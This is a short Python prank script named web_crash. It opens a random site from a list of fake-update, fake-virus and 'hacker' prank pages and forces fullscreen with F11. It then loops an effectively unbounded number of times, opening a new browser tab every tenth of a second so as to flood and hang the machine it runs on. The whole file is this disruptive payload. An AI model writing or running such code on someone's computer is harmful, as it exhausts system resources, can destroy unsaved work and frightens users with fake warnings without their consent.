def web_crash():
    import webbrowser
    import random
    import time
    import pyautogui

    # URL to open
    url = ["https://github.com/VenomTheLostOne", "https://pranx.com/win10-update/", "https://pranx.com/hacker/", "https://pranx.com/fake-virus/", "https://hackprank.com", "https://hackedscreen.com", "https://pranx.com/fake-dos/", "https://pranx.com/fbi-warning/", "https://prettycoolsite.com", "https://pranx.com/crack/", "https://pranx.com/norton-commander/", "https://elgoog.im/terminal/", "https://fakeupdate.net/wnc/", "https://fakeupdate.net/steam/", "https://fakeupdate.net/win11/", "https://fakeupdate.net/vista/", "https://geektyper.com/anon/", "https://mrdoob.com/projects/chromeexperiments/google-gravity/", ]
    # Open the URL in a web browser
    webbrowser.open(url[random.randint(0, len(url) - 1)])
    pyautogui.press('F11')
    for i in range(100000000000):
        webbrowser.open(url[random.randint(0, len(url) - 1)])
        time.sleep(0.1)

